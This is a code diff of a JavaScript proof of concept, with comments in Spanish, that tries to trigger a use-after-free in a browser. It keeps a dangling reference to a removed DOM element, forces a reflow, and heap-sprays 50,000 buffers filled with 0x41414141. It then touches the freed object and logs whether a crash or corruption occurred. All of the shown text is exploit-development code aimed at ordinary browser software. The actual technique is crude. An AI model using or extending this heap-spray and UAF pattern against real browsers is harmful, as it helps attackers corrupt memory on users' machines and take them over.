@@ -2,21 +2,20 @@ import { debug_log } from './module/utils.mjs';
 
 const container = document.querySelector(".container");
 let child = document.querySelector(".child");
+let danglingRef = null;
 
 function heapSpray() {
   const spray = [];
-  const pattern = 0x41414141; // 'AAAA'
+  const pattern = 0x41414141;
 
-  for (let i = 0; i < 2000; i++) {
-    let buf = new ArrayBuffer(0x100);
-    let view = new DataView(buf);
-    for (let j = 0; j < 0x100; j += 4) {
-      view.setUint32(j, pattern, true);
-    }
+  for (let i = 0; i < 50000; i++) {
+    let buffer = new ArrayBuffer(0x100);
+    let view = new Uint32Array(buffer);
+    view.fill(pattern);
     spray.push(view);
   }
 
-  debug_log("Heap spray with DataView completed.");
+  debug_log(`Heap spray with ${spray.length} buffers completed.`);
   return spray;
 }
 
@@ -26,50 +25,28 @@ export function triggerUAF() {
     return;
   }
 
-  try {
-    container.style.contentVisibility = "hidden";
+  // Paso 1: guardar referencia colgante
+  danglingRef = child;
 
-    // Elimina el child (esto libera memoria potencialmente reusada)
-    child.remove();
+  // Paso 2: remover el objeto del DOM
+  container.removeChild(child);
+  debug_log("Child removed, reference dangling.");
 
-    setTimeout(() => {
-      container.style.contentVisibility = "auto";
+  // Paso 3: forzar reflow (para liberar memoria)
+  document.body.offsetHeight;
 
-      const spray = heapSpray();
+  // Paso 4: ejecutar spray tras retardo
+  setTimeout(() => {
+    const spray = heapSpray();
 
-      // 1. Confirmación de que el child fue eliminado
-      if (!document.querySelector(".child")) {
-        debug_log("✅ .child element removed from DOM (memory possibly freed).");
-      } else {
-        debug_log("❌ .child element still in DOM.");
-      }
+    // Paso 5: intentar acceso a objeto eliminado
+    try {
+      danglingRef.style.background = "red";
+      debug_log("✅ Access to dangling reference succeeded (possible UAF).");
+    } catch (e) {
+      debug_log("❌ Access to dangling reference failed: " + e.message);
+    }
 
-      // 2. Revisión de patrones para detectar corrupción
-      let corrupted = false;
-      for (let i = 0; i < spray.length; i++) {
-        try {
-          let value = spray[i].getUint32(0, true);
-          if (value !== 0x41414141) {
-            debug_log(`[!] CORRUPCIÓN detectada en spray[${i}]: valor = ${value.toString(16)}`);
-            corrupted = true;
-            break;
-          }
-        } catch (e) {
-          debug_log(`[!] Excepción al leer spray[${i}]: ${e.message}`);
-          corrupted = true;
-          break;
-        }
-      }
-
-      if (!corrupted) {
-        debug_log("No se detectó corrupción visible en los DataViews.");
-      }
-
-      debug_log("UAF trigger finalizado. Observa cualquier comportamiento anómalo o crash.");
-
-    }, 0);
-
-  } catch (e) {
-    debug_log("Exception caught during triggerUAF: " + e.message);
-  }
+    debug_log("PoC completed — check for crash, log, or corruption.");
+  }, 100); // aumentar si no ves efecto
 }
